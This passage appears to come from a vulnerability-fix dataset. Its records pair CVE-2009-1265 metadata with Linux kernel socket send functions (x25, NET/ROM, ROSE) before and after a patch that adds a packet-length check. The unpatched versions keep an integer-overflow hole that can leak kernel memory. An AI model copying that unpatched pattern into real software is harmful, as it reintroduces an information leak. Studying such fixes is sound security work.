0x0F) | X25_GFI_EXTSEQ;\n\t\t\t*asmptr++ = (x25->lci >> 0) & 0xFF;\n\t\t\t*asmptr++ = X25_INTERRUPT;\n\t\t} else {\n\t\t\tasmptr    = skb_push(skb, X25_STD_MIN_LEN);\n\t\t\t*asmptr++ = ((x25->lci >> 8) & 0x0F) | X25_GFI_STDSEQ;\n\t\t\t*asmptr++ = (x25->lci >> 0) & 0xFF;\n\t\t\t*asmptr++ = X25_INTERRUPT;\n\t\t}\n\t} else {\n\t\tif (x25->neighbour->extended) {\n\t\t\t/* Build an Extended X.25 header */\n\t\t\tasmptr    = skb_push(skb, X25_EXT_MIN_LEN);\n\t\t\t*asmptr++ = ((x25->lci >> 8) & 0x0F) | X25_GFI_EXTSEQ;\n\t\t\t*asmptr++ = (x25->lci >> 0) & 0xFF;\n\t\t\t*asmptr++ = X25_DATA;\n\t\t\t*asmptr++ = X25_DATA;\n\t\t} else {\n\t\t\t/* Build an Standard X.25 header */\n\t\t\tasmptr    = skb_push(skb, X25_STD_MIN_LEN);\n\t\t\t*asmptr++ = ((x25->lci >> 8) & 0x0F) | X25_GFI_STDSEQ;\n\t\t\t*asmptr++ = (x25->lci >> 0) & 0xFF;\n\t\t\t*asmptr++ = X25_DATA;\n\t\t}\n\n\t\tif (qbit)\n\t\t\tskb->data[0] |= X25_Q_BIT;\n\t}\n\n\tSOCK_DEBUG(sk, \"x25_sendmsg: Built header.\\n\");\n\tSOCK_DEBUG(sk, \"x25_sendmsg: Transmitting buffer\\n\");\n\n\trc = -ENOTCONN;\n\tif (sk->sk_state != TCP_ESTABLISHED)\n\t\tgoto out_kfree_skb;\n\n\tif (msg->msg_flags & MSG_OOB)\n\t\tskb_queue_tail(&x25->interrupt_out_queue, skb);\n\telse {\n\t\trc = x25_output(sk, skb);\n\t\tlen = rc;\n\t\tif (rc < 0)\n\t\t\tkfree_skb(skb);\n\t\telse if (x25->qbitincl)\n\t\t\tlen++;\n\t}\n\n\t/*\n\t * lock_sock() is currently only used to serialize this x25_kick()\n\t * against input-driven x25_kick() calls. It currently only blocks\n\t * incoming packets for this socket and does not protect against\n\t * any other socket state changes and is not called from anywhere\n\t * else. As x25_kick() cannot block and as long as all socket\n\t * operations are BKL-wrapped, we don't need take to care about\n\t * purging the backlog queue in x25_release().\n\t *\n\t * Using lock_sock() to protect all socket operations entirely\n\t * (and making the whole x25 stack SMP aware) unfortunately would\n\t * require major changes to {send,recv}msg and skb allocation methods.\n\t * -> 2.5 ;)\n\t */\n\tlock_sock(sk);\n\tx25_kick(sk);\n\trelease_sock(sk);\n\trc = len;\nout:\n\treturn rc;\nout_kfree_skb:\n\tkfree_skb(skb);\n\tgoto out;\n}",
        "func": "static int x25_sendmsg(struct kiocb *iocb, struct socket *sock,\n\t\t       struct msghdr *msg, size_t len)\n{\n\tstruct sock *sk = sock->sk;\n\tstruct x25_sock *x25 = x25_sk(sk);\n\tstruct sockaddr_x25 *usx25 = (struct sockaddr_x25 *)msg->msg_name;\n\tstruct sockaddr_x25 sx25;\n\tstruct sk_buff *skb;\n\tunsigned char *asmptr;\n\tint noblock = msg->msg_flags & MSG_DONTWAIT;\n\tsize_t size;\n\tint qbit = 0, rc = -EINVAL;\n\n\tif (msg->msg_flags & ~(MSG_DONTWAIT|MSG_OOB|MSG_EOR|MSG_CMSG_COMPAT))\n\t\tgoto out;\n\n\t/* we currently don't support segmented records at the user interface */\n\tif (!(msg->msg_flags & (MSG_EOR|MSG_OOB)))\n\t\tgoto out;\n\n\trc = -EADDRNOTAVAIL;\n\tif (sock_flag(sk, SOCK_ZAPPED))\n\t\tgoto out;\n\n\trc = -EPIPE;\n\tif (sk->sk_shutdown & SEND_SHUTDOWN) {\n\t\tsend_sig(SIGPIPE, current, 0);\n\t\tgoto out;\n\t}\n\n\trc = -ENETUNREACH;\n\tif (!x25->neighbour)\n\t\tgoto out;\n\n\tif (usx25) {\n\t\trc = -EINVAL;\n\t\tif (msg->msg_namelen < sizeof(sx25))\n\t\t\tgoto out;\n\t\tmemcpy(&sx25, usx25, sizeof(sx25));\n\t\trc = -EISCONN;\n\t\tif (strcmp(x25->dest_addr.x25_addr, sx25.sx25_addr.x25_addr))\n\t\t\tgoto out;\n\t\trc = -EINVAL;\n\t\tif (sx25.sx25_family != AF_X25)\n\t\t\tgoto out;\n\t} else {\n\t\t/*\n\t\t *\tFIXME 1003.1g - if the socket is like this because\n\t\t *\tit has become closed (not started closed) we ought\n\t\t *\tto SIGPIPE, EPIPE;\n\t\t */\n\t\trc = -ENOTCONN;\n\t\tif (sk->sk_state != TCP_ESTABLISHED)\n\t\t\tgoto out;\n\n\t\tsx25.sx25_family = AF_X25;\n\t\tsx25.sx25_addr   = x25->dest_addr;\n\t}\n\n\t/* Sanity check the packet size */\n\tif (len > 65535) {\n\t\trc = -EMSGSIZE;\n\t\tgoto out;\n\t}\n\n\tSOCK_DEBUG(sk, \"x25_sendmsg: sendto: Addresses built.\\n\");\n\n\t/* Build a packet */\n\tSOCK_DEBUG(sk, \"x25_sendmsg: sendto: building packet.\\n\");\n\n\tif ((msg->msg_flags & MSG_OOB) && len > 32)\n\t\tlen = 32;\n\n\tsize = len + X25_MAX_L2_LEN + X25_EXT_MIN_LEN;\n\n\tskb = sock_alloc_send_skb(sk, size, noblock, &rc);\n\tif (!skb)\n\t\tgoto out;\n\tX25_SKB_CB(skb)->flags = msg->msg_flags;\n\n\tskb_reserve(skb, X25_MAX_L2_LEN + X25_EXT_MIN_LEN);\n\n\t/*\n\t *\tPut the data on the end\n\t */\n\tSOCK_DEBUG(sk, \"x25_sendmsg: Copying user data\\n\");\n\n\tskb_reset_transport_header(skb);\n\tskb_put(skb, len);\n\n\trc = memcpy_fromiovec(skb_transport_header(skb), msg->msg_iov, len);\n\tif (rc)\n\t\tgoto out_kfree_skb;\n\n\t/*\n\t *\tIf the Q BIT Include socket option is in force, the first\n\t *\tbyte of the user data is the logical value of the Q Bit.\n\t */\n\tif (x25->qbitincl) {\n\t\tqbit = skb->data[0];\n\t\tskb_pull(skb, 1);\n\t}\n\n\t/*\n\t *\tPush down the X.25 header\n\t */\n\tSOCK_DEBUG(sk, \"x25_sendmsg: Building X.25 Header.\\n\");\n\n\tif (msg->msg_flags & MSG_OOB) {\n\t\tif (x25->neighbour->extended) {\n\t\t\tasmptr    = skb_push(skb, X25_STD_MIN_LEN);\n\t\t\t*asmptr++ = ((x25->lci >> 8) & 0x0F) | X25_GFI_EXTSEQ;\n\t\t\t*asmptr++ = (x25->lci >> 0) & 0xFF;\n\t\t\t*asmptr++ = X25_INTERRUPT;\n\t\t} else {\n\t\t\tasmptr    = skb_push(skb, X25_STD_MIN_LEN);\n\t\t\t*asmptr++ = ((x25->lci >> 8) & 0x0F) | X25_GFI_STDSEQ;\n\t\t\t*asmptr++ = (x25->lci >> 0) & 0xFF;\n\t\t\t*asmptr++ = X25_INTERRUPT;\n\t\t}\n\t} else {\n\t\tif (x25->neighbour->extended) {\n\t\t\t/* Build an Extended X.25 header */\n\t\t\tasmptr    = skb_push(skb, X25_EXT_MIN_LEN);\n\t\t\t*asmptr++ = ((x25->lci >> 8) & 0x0F) | X25_GFI_EXTSEQ;\n\t\t\t*asmptr++ = (x25->lci >> 0) & 0xFF;\n\t\t\t*asmptr++ = X25_DATA;\n\t\t\t*asmptr++ = X25_DATA;\n\t\t} else {\n\t\t\t/* Build an Standard X.25 header */\n\t\t\tasmptr    = skb_push(skb, X25_STD_MIN_LEN);\n\t\t\t*asmptr++ = ((x25->lci >> 8) & 0x0F) | X25_GFI_STDSEQ;\n\t\t\t*asmptr++ = (x25->lci >> 0) & 0xFF;\n\t\t\t*asmptr++ = X25_DATA;\n\t\t}\n\n\t\tif (qbit)\n\t\t\tskb->data[0] |= X25_Q_BIT;\n\t}\n\n\tSOCK_DEBUG(sk, \"x25_sendmsg: Built header.\\n\");\n\tSOCK_DEBUG(sk, \"x25_sendmsg: Transmitting buffer\\n\");\n\n\trc = -ENOTCONN;\n\tif (sk->sk_state != TCP_ESTABLISHED)\n\t\tgoto out_kfree_skb;\n\n\tif (msg->msg_flags & MSG_OOB)\n\t\tskb_queue_tail(&x25->interrupt_out_queue, skb);\n\telse {\n\t\trc = x25_output(sk, skb);\n\t\tlen = rc;\n\t\tif (rc < 0)\n\t\t\tkfree_skb(skb);\n\t\telse if (x25->qbitincl)\n\t\t\tlen++;\n\t}\n\n\t/*\n\t * lock_sock() is currently only used to serialize this x25_kick()\n\t * against input-driven x25_kick() calls. It currently only blocks\n\t * incoming packets for this socket and does not protect against\n\t * any other socket state changes and is not called from anywhere\n\t * else. As x25_kick() cannot block and as long as all socket\n\t * operations are BKL-wrapped, we don't need take to care about\n\t * purging the backlog queue in x25_release().\n\t *\n\t * Using lock_sock() to protect all socket operations entirely\n\t * (and making the whole x25 stack SMP aware) unfortunately would\n\t * require major changes to {send,recv}msg and skb allocation methods.\n\t * -> 2.5 ;)\n\t */\n\tlock_sock(sk);\n\tx25_kick(sk);\n\trelease_sock(sk);\n\trc = len;\nout:\n\treturn rc;\nout_kfree_skb:\n\tkfree_skb(skb);\n\tgoto out;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -55,6 +55,12 @@\n \n \t\tsx25.sx25_family = AF_X25;\n \t\tsx25.sx25_addr   = x25->dest_addr;\n+\t}\n+\n+\t/* Sanity check the packet size */\n+\tif (len > 65535) {\n+\t\trc = -EMSGSIZE;\n+\t\tgoto out;\n \t}\n \n \tSOCK_DEBUG(sk, \"x25_sendmsg: sendto: Addresses built.\\n\");",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "\t}",
                "",
                "\t/* Sanity check the packet size */",
                "\tif (len > 65535) {",
                "\t\trc = -EMSGSIZE;",
                "\t\tgoto out;"
            ]
        }
    },
    {
        "cve_id": "CVE-2009-1265",
        "func_name": "torvalds/linux/nr_sendmsg",
        "description": "Integer overflow in rose_sendmsg (sys/net/af_rose.c) in the Linux kernel 2.6.24.4, and other versions before 2.6.30-rc1, might allow remote attackers to obtain sensitive information via a large length value, which causes \"garbage\" memory to be sent.",
        "git_url": "http://git.kernel.org/?p=linux/kernel/git/torvalds/linux.git;a=commitdiff;h=83e0bbcbe2145f160fbaa109b0439dae7f4a38a9",
        "commit_title": "Otherwise we can wrap the sizes and end up sending garbage.",
        "commit_text": " Closes #10423  ",
        "func_before": "static int nr_sendmsg(struct kiocb *iocb, struct socket *sock,\n\t\t      struct msghdr *msg, size_t len)\n{\n\tstruct sock *sk = sock->sk;\n\tstruct nr_sock *nr = nr_sk(sk);\n\tstruct sockaddr_ax25 *usax = (struct sockaddr_ax25 *)msg->msg_name;\n\tint err;\n\tstruct sockaddr_ax25 sax;\n\tstruct sk_buff *skb;\n\tunsigned char *asmptr;\n\tint size;\n\n\t/* Netrom empty data frame has no meaning : don't send */\n\tif (len == 0)\n\t\treturn 0;\n\n\tif (msg->msg_flags & ~(MSG_DONTWAIT|MSG_EOR|MSG_CMSG_COMPAT))\n\t\treturn -EINVAL;\n\n\tlock_sock(sk);\n\tif (sock_flag(sk, SOCK_ZAPPED)) {\n\t\terr = -EADDRNOTAVAIL;\n\t\tgoto out;\n\t}\n\n\tif (sk->sk_shutdown & SEND_SHUTDOWN) {\n\t\tsend_sig(SIGPIPE, current, 0);\n\t\terr = -EPIPE;\n\t\tgoto out;\n\t}\n\n\tif (nr->device == NULL) {\n\t\terr = -ENETUNREACH;\n\t\tgoto out;\n\t}\n\n\tif (usax) {\n\t\tif (msg->msg_namelen < sizeof(sax)) {\n\t\t\terr = -EINVAL;\n\t\t\tgoto out;\n\t\t}\n\t\tsax = *usax;\n\t\tif (ax25cmp(&nr->dest_addr, &sax.sax25_call) != 0) {\n\t\t\terr = -EISCONN;\n\t\t\tgoto out;\n\t\t}\n\t\tif (sax.sax25_family != AF_NETROM) {\n\t\t\terr = -EINVAL;\n\t\t\tgoto out;\n\t\t}\n\t} else {\n\t\tif (sk->sk_state != TCP_ESTABLISHED) {\n\t\t\terr = -ENOTCONN;\n\t\t\tgoto out;\n\t\t}\n\t\tsax.sax25_family = AF_NETROM;\n\t\tsax.sax25_call   = nr->dest_addr;\n\t}\n\n\tSOCK_DEBUG(sk, \"NET/ROM: sendto: Addresses built.\\n\");\n\n\t/* Build a packet */\n\tSOCK_DEBUG(sk, \"NET/ROM: sendto: building packet.\\n\");\n\tsize = len + NR_NETWORK_LEN + NR_TRANSPORT_LEN;\n\n\tif ((skb = sock_alloc_send_skb(sk, size, msg->msg_flags & MSG_DONTWAIT, &err)) == NULL)\n\t\tgoto out;\n\n\tskb_reserve(skb, size - len);\n\tskb_reset_transport_header(skb);\n\n\t/*\n\t *\tPush down the NET/ROM header\n\t */\n\n\tasmptr = skb_push(skb, NR_TRANSPORT_LEN);\n\tSOCK_DEBUG(sk, \"Building NET/ROM Header.\\n\");\n\n\t/* Build a NET/ROM Transport header */\n\n\t*asmptr++ = nr->your_index;\n\t*asmptr++ = nr->your_id;\n\t*asmptr++ = 0;\t\t/* To be filled in later */\n\t*asmptr++ = 0;\t\t/*      Ditto            */\n\t*asmptr++ = NR_INFO;\n\tSOCK_DEBUG(sk, \"Built header.\\n\");\n\n\t/*\n\t *\tPut the data on the end\n\t */\n\tskb_put(skb, len);\n\n\tSOCK_DEBUG(sk, \"NET/ROM: Appending user data\\n\");\n\n\t/* User data follows immediately after the NET/ROM transport header */\n\tif (memcpy_fromiovec(skb_transport_header(skb), msg->msg_iov, len)) {\n\t\tkfree_skb(skb);\n\t\terr = -EFAULT;\n\t\tgoto out;\n\t}\n\n\tSOCK_DEBUG(sk, \"NET/ROM: Transmitting buffer\\n\");\n\n\tif (sk->sk_state != TCP_ESTABLISHED) {\n\t\tkfree_skb(skb);\n\t\terr = -ENOTCONN;\n\t\tgoto out;\n\t}\n\n\tnr_output(sk, skb);\t/* Shove it onto the queue */\n\n\terr = len;\nout:\n\trelease_sock(sk);\n\treturn err;\n}",
        "func": "static int nr_sendmsg(struct kiocb *iocb, struct socket *sock,\n\t\t      struct msghdr *msg, size_t len)\n{\n\tstruct sock *sk = sock->sk;\n\tstruct nr_sock *nr = nr_sk(sk);\n\tstruct sockaddr_ax25 *usax = (struct sockaddr_ax25 *)msg->msg_name;\n\tint err;\n\tstruct sockaddr_ax25 sax;\n\tstruct sk_buff *skb;\n\tunsigned char *asmptr;\n\tint size;\n\n\t/* Netrom empty data frame has no meaning : don't send */\n\tif (len == 0)\n\t\treturn 0;\n\n\tif (msg->msg_flags & ~(MSG_DONTWAIT|MSG_EOR|MSG_CMSG_COMPAT))\n\t\treturn -EINVAL;\n\n\tlock_sock(sk);\n\tif (sock_flag(sk, SOCK_ZAPPED)) {\n\t\terr = -EADDRNOTAVAIL;\n\t\tgoto out;\n\t}\n\n\tif (sk->sk_shutdown & SEND_SHUTDOWN) {\n\t\tsend_sig(SIGPIPE, current, 0);\n\t\terr = -EPIPE;\n\t\tgoto out;\n\t}\n\n\tif (nr->device == NULL) {\n\t\terr = -ENETUNREACH;\n\t\tgoto out;\n\t}\n\n\tif (usax) {\n\t\tif (msg->msg_namelen < sizeof(sax)) {\n\t\t\terr = -EINVAL;\n\t\t\tgoto out;\n\t\t}\n\t\tsax = *usax;\n\t\tif (ax25cmp(&nr->dest_addr, &sax.sax25_call) != 0) {\n\t\t\terr = -EISCONN;\n\t\t\tgoto out;\n\t\t}\n\t\tif (sax.sax25_family != AF_NETROM) {\n\t\t\terr = -EINVAL;\n\t\t\tgoto out;\n\t\t}\n\t} else {\n\t\tif (sk->sk_state != TCP_ESTABLISHED) {\n\t\t\terr = -ENOTCONN;\n\t\t\tgoto out;\n\t\t}\n\t\tsax.sax25_family = AF_NETROM;\n\t\tsax.sax25_call   = nr->dest_addr;\n\t}\n\n\tSOCK_DEBUG(sk, \"NET/ROM: sendto: Addresses built.\\n\");\n\n\t/* Build a packet - the conventional user limit is 236 bytes. We can\n\t   do ludicrously large NetROM frames but must not overflow */\n\tif (len > 65536)\n\t\treturn -EMSGSIZE;\n\n\tSOCK_DEBUG(sk, \"NET/ROM: sendto: building packet.\\n\");\n\tsize = len + NR_NETWORK_LEN + NR_TRANSPORT_LEN;\n\n\tif ((skb = sock_alloc_send_skb(sk, size, msg->msg_flags & MSG_DONTWAIT, &err)) == NULL)\n\t\tgoto out;\n\n\tskb_reserve(skb, size - len);\n\tskb_reset_transport_header(skb);\n\n\t/*\n\t *\tPush down the NET/ROM header\n\t */\n\n\tasmptr = skb_push(skb, NR_TRANSPORT_LEN);\n\tSOCK_DEBUG(sk, \"Building NET/ROM Header.\\n\");\n\n\t/* Build a NET/ROM Transport header */\n\n\t*asmptr++ = nr->your_index;\n\t*asmptr++ = nr->your_id;\n\t*asmptr++ = 0;\t\t/* To be filled in later */\n\t*asmptr++ = 0;\t\t/*      Ditto            */\n\t*asmptr++ = NR_INFO;\n\tSOCK_DEBUG(sk, \"Built header.\\n\");\n\n\t/*\n\t *\tPut the data on the end\n\t */\n\tskb_put(skb, len);\n\n\tSOCK_DEBUG(sk, \"NET/ROM: Appending user data\\n\");\n\n\t/* User data follows immediately after the NET/ROM transport header */\n\tif (memcpy_fromiovec(skb_transport_header(skb), msg->msg_iov, len)) {\n\t\tkfree_skb(skb);\n\t\terr = -EFAULT;\n\t\tgoto out;\n\t}\n\n\tSOCK_DEBUG(sk, \"NET/ROM: Transmitting buffer\\n\");\n\n\tif (sk->sk_state != TCP_ESTABLISHED) {\n\t\tkfree_skb(skb);\n\t\terr = -ENOTCONN;\n\t\tgoto out;\n\t}\n\n\tnr_output(sk, skb);\t/* Shove it onto the queue */\n\n\terr = len;\nout:\n\trelease_sock(sk);\n\treturn err;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -59,7 +59,11 @@\n \n \tSOCK_DEBUG(sk, \"NET/ROM: sendto: Addresses built.\\n\");\n \n-\t/* Build a packet */\n+\t/* Build a packet - the conventional user limit is 236 bytes. We can\n+\t   do ludicrously large NetROM frames but must not overflow */\n+\tif (len > 65536)\n+\t\treturn -EMSGSIZE;\n+\n \tSOCK_DEBUG(sk, \"NET/ROM: sendto: building packet.\\n\");\n \tsize = len + NR_NETWORK_LEN + NR_TRANSPORT_LEN;\n ",
        "diff_line_info": {
            "deleted_lines": [
                "\t/* Build a packet */"
            ],
            "added_lines": [
                "\t/* Build a packet - the conventional user limit is 236 bytes. We can",
                "\t   do ludicrously large NetROM frames but must not overflow */",
                "\tif (len > 65536)",
                "\t\treturn -EMSGSIZE;",
                ""
            ]
        }
    },
    {
        "cve_id": "CVE-2009-1265",
        "func_name": "torvalds/linux/rose_sendmsg",
        "description": "Integer overflow in rose_sendmsg (sys/net/af_rose.c) in the Linux kernel 2.6.24.4, and other versions before 2.6.30-rc1, might allow remote attackers to obtain sensitive information via a large length value, which causes \"garbage\" memory to be sent.",
        "git_url": "http://git.kernel.org/?p=linux/kernel/git/torvalds/linux.git;a=commitdiff;h=83e0bbcbe2145f160fbaa109b0439dae7f4a38a9",
        "commit_title": "Otherwise we can wrap the sizes and end up sending garbage.",
        "commit_text": " Closes #10423  ",
        "func_before": "static int rose_sendmsg(struct kiocb *iocb, struct socket *sock,\n\t\t\tstruct msghdr *msg, size_t len)\n{\n\tstruct sock *sk = sock->sk;\n\tstruct rose_sock *rose = rose_sk(sk);\n\tstruct sockaddr_rose *usrose = (struct sockaddr_rose *)msg->msg_name;\n\tint err;\n\tstruct full_sockaddr_rose srose;\n\tstruct sk_buff *skb;\n\tunsigned char *asmptr;\n\tint n, size, qbit = 0;\n\n\t/* ROSE empty frame has no meaning : don't send */\n\tif (len == 0)\n\t\treturn 0;\n\n\tif (msg->msg_flags & ~(MSG_DONTWAIT|MSG_EOR|MSG_CMSG_COMPAT))\n\t\treturn -EINVAL;\n\n\tif (sock_flag(sk, SOCK_ZAPPED))\n\t\treturn -EADDRNOTAVAIL;\n\n\tif (sk->sk_shutdown & SEND_SHUTDOWN) {\n\t\tsend_sig(SIGPIPE, current, 0);\n\t\treturn -EPIPE;\n\t}\n\n\tif (rose->neighbour == NULL || rose->device == NULL)\n\t\treturn -ENETUNREACH;\n\n\tif (usrose != NULL) {\n\t\tif (msg->msg_namelen != sizeof(struct sockaddr_rose) && msg->msg_namelen != sizeof(struct full_sockaddr_rose))\n\t\t\treturn -EINVAL;\n\t\tmemset(&srose, 0, sizeof(struct full_sockaddr_rose));\n\t\tmemcpy(&srose, usrose, msg->msg_namelen);\n\t\tif (rosecmp(&rose->dest_addr, &srose.srose_addr) != 0 ||\n\t\t    ax25cmp(&rose->dest_call, &srose.srose_call) != 0)\n\t\t\treturn -EISCONN;\n\t\tif (srose.srose_ndigis != rose->dest_ndigis)\n\t\t\treturn -EISCONN;\n\t\tif (srose.srose_ndigis == rose->dest_ndigis) {\n\t\t\tfor (n = 0 ; n < srose.srose_ndigis ; n++)\n\t\t\t\tif (ax25cmp(&rose->dest_digis[n],\n\t\t\t\t\t    &srose.srose_digis[n]))\n\t\t\t\t\treturn -EISCONN;\n\t\t}\n\t\tif (srose.srose_family != AF_ROSE)\n\t\t\treturn -EINVAL;\n\t} else {\n\t\tif (sk->sk_state != TCP_ESTABLISHED)\n\t\t\treturn -ENOTCONN;\n\n\t\tsrose.srose_family = AF_ROSE;\n\t\tsrose.srose_addr   = rose->dest_addr;\n\t\tsrose.srose_call   = rose->dest_call;\n\t\tsrose.srose_ndigis = rose->dest_ndigis;\n\t\tfor (n = 0 ; n < rose->dest_ndigis ; n++)\n\t\t\tsrose.srose_digis[n] = rose->dest_digis[n];\n\t}\n\n\tSOCK_DEBUG(sk, \"ROSE: sendto: Addresses built.\\n\");\n\n\t/* Build a packet */\n\tSOCK_DEBUG(sk, \"ROSE: sendto: building packet.\\n\");\n\tsize = len + AX25_BPQ_HEADER_LEN + AX25_MAX_HEADER_LEN + ROSE_MIN_LEN;\n\n\tif ((skb = sock_alloc_send_skb(sk, size, msg->msg_flags & MSG_DONTWAIT, &err)) == NULL)\n\t\treturn err;\n\n\tskb_reserve(skb, AX25_BPQ_HEADER_LEN + AX25_MAX_HEADER_LEN + ROSE_MIN_LEN);\n\n\t/*\n\t *\tPut the data on the end\n\t */\n\tSOCK_DEBUG(sk, \"ROSE: Appending user data\\n\");\n\n\tskb_reset_transport_header(skb);\n\tskb_put(skb, len);\n\n\terr = memcpy_fromiovec(skb_transport_header(skb), msg->msg_iov, len);\n\tif (err) {\n\t\tkfree_skb(skb);\n\t\treturn err;\n\t}\n\n\t/*\n\t *\tIf the Q BIT Include socket option is in force, the first\n\t *\tbyte of the user data is the logical value of the Q Bit.\n\t */\n\tif (rose->qbitincl) {\n\t\tqbit = skb->data[0];\n\t\tskb_pull(skb, 1);\n\t}\n\n\t/*\n\t *\tPush down the ROSE header\n\t */\n\tasmptr = skb_push(skb, ROSE_MIN_LEN);\n\n\tSOCK_DEBUG(sk, \"ROSE: Building Network Header.\\n\");\n\n\t/* Build a ROSE Network header */\n\tasmptr[0] = ((rose->lci >> 8) & 0x0F) | ROSE_GFI;\n\tasmptr[1] = (rose->lci >> 0) & 0xFF;\n\tasmptr[2] = ROSE_DATA;\n\n\tif (qbit)\n\t\tasmptr[0] |= ROSE_Q_BIT;\n\n\tSOCK_DEBUG(sk, \"ROSE: Built header.\\n\");\n\n\tSOCK_DEBUG(sk, \"ROSE: Transmitting buffer\\n\");\n\n\tif (sk->sk_state != TCP_ESTABLISHED) {\n\t\tkfree_skb(skb);\n\t\treturn -ENOTCONN;\n\t}\n\n#ifdef M_BIT\n#define ROSE_PACLEN (256-ROSE_MIN_LEN)\n\tif (skb->len - ROSE_MIN_LEN > ROSE_PACLEN) {\n\t\tunsigned char header[ROSE_MIN_LEN];\n\t\tstruct sk_buff *skbn;\n\t\tint frontlen;\n\t\tint lg;\n\n\t\t/* Save a copy of the Header */\n\t\tskb_copy_from_linear_data(skb, header, ROSE_MIN_LEN);\n\t\tskb_pull(skb, ROSE_MIN_LEN);\n\n\t\tfrontlen = skb_headroom(skb);\n\n\t\twhile (skb->len > 0) {\n\t\t\tif ((skbn = sock_alloc_send_skb(sk, frontlen + ROSE_PACLEN, 0, &err)) == NULL) {\n\t\t\t\tkfree_skb(skb);\n\t\t\t\treturn err;\n\t\t\t}\n\n\t\t\tskbn->sk   = sk;\n\t\t\tskbn->free = 1;\n\t\t\tskbn->arp  = 1;\n\n\t\t\tskb_reserve(skbn, frontlen);\n\n\t\t\tlg = (ROSE_PACLEN > skb->len) ? skb->len : ROSE_PACLEN;\n\n\t\t\t/* Copy the user data */\n\t\t\tskb_copy_from_linear_data(skb, skb_put(skbn, lg), lg);\n\t\t\tskb_pull(skb, lg);\n\n\t\t\t/* Duplicate the Header */\n\t\t\tskb_push(skbn, ROSE_MIN_LEN);\n\t\t\tskb_copy_to_linear_data(skbn, header, ROSE_MIN_LEN);\n\n\t\t\tif (skb->len > 0)\n\t\t\t\tskbn->data[2] |= M_BIT;\n\n\t\t\tskb_queue_tail(&sk->sk_write_queue, skbn); /* Throw it on the queue */\n\t\t}\n\n\t\tskb->free = 1;\n\t\tkfree_skb(skb);\n\t} else {\n\t\tskb_queue_tail(&sk->sk_write_queue, skb);\t\t/* Throw it on the queue */\n\t}\n#else\n\tskb_queue_tail(&sk->sk_write_queue, skb);\t/* Shove it onto the queue */\n#endif\n\n\trose_kick(sk);\n\n\treturn len;\n}",
        "func": "static int rose_sendmsg(struct kiocb *iocb, struct socket *sock,\n\t\t\tstruct msghdr *msg, size_t len)\n{\n\tstruct sock *sk = sock->sk;\n\tstruct rose_sock *rose = rose_sk(sk);\n\tstruct sockaddr_rose *usrose = (struct sockaddr_rose *)msg->msg_name;\n\tint err;\n\tstruct full_sockaddr_rose srose;\n\tstruct sk_buff *skb;\n\tunsigned char *asmptr;\n\tint n, size, qbit = 0;\n\n\t/* ROSE empty frame has no meaning : don't send */\n\tif (len == 0)\n\t\treturn 0;\n\n\tif (msg->msg_flags & ~(MSG_DONTWAIT|MSG_EOR|MSG_CMSG_COMPAT))\n\t\treturn -EINVAL;\n\n\tif (sock_flag(sk, SOCK_ZAPPED))\n\t\treturn -EADDRNOTAVAIL;\n\n\tif (sk->sk_shutdown & SEND_SHUTDOWN) {\n\t\tsend_sig(SIGPIPE, current, 0);\n\t\treturn -EPIPE;\n\t}\n\n\tif (rose->neighbour == NULL || rose->device == NULL)\n\t\treturn -ENETUNREACH;\n\n\tif (usrose != NULL) {\n\t\tif (msg->msg_namelen != sizeof(struct sockaddr_rose) && msg->msg_namelen != sizeof(struct full_sockaddr_rose))\n\t\t\treturn -EINVAL;\n\t\tmemset(&srose, 0, sizeof(struct full_sockaddr_rose));\n\t\tmemcpy(&srose, usrose, msg->msg_namelen);\n\t\tif (rosecmp(&rose->dest_addr, &srose.srose_addr) != 0 ||\n\t\t    ax25cmp(&rose->dest_call, &srose.srose_call) != 0)\n\t\t\treturn -EISCONN;\n\t\tif (srose.srose_ndigis != rose->dest_ndigis)\n\t\t\treturn -EISCONN;\n\t\tif (srose.srose_ndigis == rose->dest_ndigis) {\n\t\t\tfor (n = 0 ; n < srose.srose_ndigis ; n++)\n\t\t\t\tif (ax25cmp(&rose->dest_digis[n],\n\t\t\t\t\t    &srose.srose_digis[n]))\n\t\t\t\t\treturn -EISCONN;\n\t\t}\n\t\tif (srose.srose_family != AF_ROSE)\n\t\t\treturn -EINVAL;\n\t} else {\n\t\tif (sk->sk_state != TCP_ESTABLISHED)\n\t\t\treturn -ENOTCONN;\n\n\t\tsrose.srose_family = AF_ROSE;\n\t\tsrose.srose_addr   = rose->dest_addr;\n\t\tsrose.srose_call   = rose->dest_call;\n\t\tsrose.srose_ndigis = rose->dest_ndigis;\n\t\tfor (n = 0 ; n < rose->dest_ndigis ; n++)\n\t\t\tsrose.srose_digis[n] = rose->dest_digis[n];\n\t}\n\n\tSOCK_DEBUG(sk, \"ROSE: sendto: Addresses built.\\n\");\n\n\t/* Build a packet */\n\tSOCK_DEBUG(sk, \"ROSE: sendto: building packet.\\n\");\n\t/* Sanity check the packet size */\n\tif (len > 65535)\n\t\treturn -EMSGSIZE;\n\n\tsize = len + AX25_BPQ_HEADER_LEN + AX25_MAX_HEADER_LEN + ROSE_MIN_LEN;\n\n\tif ((skb = sock_alloc_send_skb(sk, size, msg->msg_flags & MSG_DONTWAIT, &err)) == NULL)\n\t\treturn err;\n\n\tskb_reserve(skb, AX25_BPQ_HEADER_LEN + AX25_MAX_HEADER_LEN + ROSE_MIN_LEN);\n\n\t/*\n\t *\tPut the data on the end\n\t */\n\tSOCK_DEBUG(sk, \"ROSE: Appending user data\\n\");\n\n\tskb_reset_transport_header(skb);\n\tskb_put(skb, len);\n\n\terr = memcpy_fromiovec(skb_transport_header(skb), msg->msg_iov, len);\n\tif (err) {\n\t\tkfree_skb(skb);\n\t\treturn err;\n\t}\n\n\t/*\n\t *\tIf the Q BIT Include socket option is in force, the first\n\t *\tbyte of the user data is the logical value of the Q Bit.\n\t */\n\tif (rose->qbitincl) {\n\t\tqbit = skb->data[0];\n\t\tskb_pull(skb, 1);\n\t}\n\n\t/*\n\t *\tPush down the ROSE header\n\t */\n\tasmptr = skb_push(skb, ROSE_MIN_LEN);\n\n\tSOCK_DEBUG(sk, \"ROSE: Building Network Header.\\n\");\n\n\t/* Build a ROSE Network header */\n\tasmptr[0] = ((rose->lci >> 8) & 0x0F) | ROSE_GFI;\n\tasmptr[1] = (rose->lci >> 0) & 0xFF;\n\tasmptr[2] = ROSE_DATA;\n\n\tif (qbit)\n\t\tasmptr[0] |= ROSE_Q_BIT;\n\n\tSOCK_DEBUG(sk, \"ROSE: Built header.\\n\");\n\n\tSOCK_DEBUG(sk, \"ROSE: Transmitting 